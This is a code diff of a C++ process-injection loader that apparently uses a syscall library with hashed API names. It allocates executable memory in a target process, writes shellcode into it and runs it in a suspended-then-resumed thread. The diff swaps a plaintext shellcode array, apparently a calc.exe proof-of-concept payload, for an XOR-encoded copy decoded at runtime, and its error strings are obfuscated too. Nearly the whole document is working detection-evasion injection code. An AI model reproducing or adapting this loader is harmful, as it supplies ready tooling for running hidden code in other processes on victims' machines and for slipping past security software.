@@ -8,27 +8,21 @@
 #include <winnt.h>
 
 int main(int argc, char *argv[]) {
-  unsigned char shellcode[] =
-      "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
-      "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
-      "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
-      "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
-      "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
-      "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
-      "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
-      "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
-      "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
-      "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
-      "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
-      "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
-      "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
-      "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
-      "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-      "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
-      "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
-      "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
-      "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-      "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+  const size_t shellcodeSize = 276; // Size of shellcode before encryption
+  const std::string encryptedShellcode =
+      "IAVFdwtpNAI+ek5rKnNxQHZWQX8Ha2QHbHseY3xxdEFzUEV3AGs1BG5/"
+      "H2txIXRCcFZFdws4ZARpch9rcSF0QnRWRXcLOGYEbXofa3klI0dyB0UuBz5iBztzH2t6ciJA"
+      "JwVCLAVrZlVoeBkwe3N1QSVXEnYDPmUHaHtIYixxJBRzVEV+"
+      "BmtlDmAoHmF7c3kSclRCLAdiYQc8ehMxcXN5SHZWQX8DamUOYH9IY353d0dyXkF+"
+      "V2pkBmAoH2t4e3VEfgRFfwFqZQ9oe09jLHB0RnJeFylQY2UHYCgYZ3F7dUh2VxV5Bz5iBztz"
+      "H2t6ciJAJwVFflBrMg9oLh9ieXIiQXVeFH8EbzcHbCkbYH0gc0R2XkV6AGM1B29/"
+      "T2t8e3VEfgRFfwFuZQ9oe09jf3V1QX4EQSwHYmUCYCgfY3ggdUl2VxV/"
+      "B2tpVGh+E2t9e3FBIlZFfgZiZQdtch42fHp0EXJXRHcHa2QPbHseMn17eUMjBUN/"
+      "B2tkBD4sTmN8e3VBc19ELgdiaVRpeE5qfHQnFiAAFykGPmUOOisbYnlzcUB2VkF/"
+      "A2phBmh6H2txJ3kUdldBfgNqYQZse0kyenJ5EnAASXhVPDUDOihOY3gncxF2B0V+UTswAGF/"
+      "STdwJycWIlNFdwtpMgJqchgweXV2E3YHSX9VODQGb38bZishdUd3VUZ9BTxnV2h6Hmp9cnlJ"
+      "IgcXKVdvZwVuex0wf3BzFXBTRncFb2EG";
+
   if (argc != 2)
     throw std::runtime_error(
         nullgate::hashing::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
@@ -48,7 +42,7 @@ int main(int argc, char *argv[]) {
         std::to_string(status));
 
   PVOID buf = NULL;
-  size_t regionSize = sizeof(shellcode);
+  size_t regionSize = shellcodeSize;
   status = syscalls.Call(
       nullgate::hashing::fnv1Const("NtAllocateVirtualMemory"), processHandle,
       &buf, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -60,9 +54,12 @@ int main(int argc, char *argv[]) {
         std::to_string(status));
   }
 
-  status = syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
-                         processHandle, buf, (void *)&shellcode,
-                         sizeof(shellcode), NULL);
+  // A thread cannot be created if it's context hasn't been initialized(At least
+  // it didn't work for me)
+  const char fakebuf[] = "pwned";
+  status =
+      syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
+                    processHandle, buf, (void *)fakebuf, sizeof(fakebuf), NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(nullgate::hashing::xorDecode(
@@ -72,21 +69,45 @@ int main(int argc, char *argv[]) {
   }
 
   HANDLE threadHandle = NULL;
-  status = syscalls.Call(nullgate::hashing::fnv1Const("NtCreateThreadEx"),
-                         &threadHandle, THREAD_ALL_ACCESS, &objectAttrs,
-                         processHandle, buf, NULL, 0, 0, 0, 0, NULL);
+  status =
+      syscalls.Call(nullgate::hashing::fnv1Const("NtCreateThreadEx"),
+                    &threadHandle, THREAD_ALL_ACCESS, &objectAttrs,
+                    processHandle, buf, CREATE_SUSPENDED, 0, 0, 0, 0, NULL);
+  if (!NT_SUCCESS(status)) {
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    throw std::runtime_error(
+        nullgate::hashing::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
+                                     "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
+        std::to_string(status));
+  }
+
+  auto decryptedShellcode = nullgate::hashing::hex2bin(
+      nullgate::hashing::xorDecode(encryptedShellcode));
+  status = syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
+                         processHandle, buf, (void *)decryptedShellcode.data(),
+                         decryptedShellcode.size(), NULL);
   if (!NT_SUCCESS(status)) {
     syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(nullgate::hashing::xorDecode(
-                                 "BQkEI1c0dkJ4LU4naSAzFScSFG9bOz9SNC8LOidjNRgjR"
-                                 "gUnVnohRDcpTiA6b2EWJw8dKld6Jl8sIhFz") +
+                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
+                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
                              std::to_string(status));
+  }
+
+  status = syscalls.Call(nullgate::hashing::fnv1Const("NtResumeThread"),
+                         threadHandle, NULL);
+  if (!NT_SUCCESS(status)) {
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), threadHandle);
+    throw std::runtime_error(
+        nullgate::hashing::xorDecode(
+            "BQkEI1c0dkJ4OE4gPC4kUDIOAypSPn0WPitCPywnYQcvEhl1Ew==") +
+        std::to_string(status));
   }
 
   syscalls.Call(nullgate::hashing::fnv1Const("NtWaitForSingleObject"),
                 threadHandle, INFINITE);
 
   syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), threadHandle);
-  status =
-      syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+  syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
 }
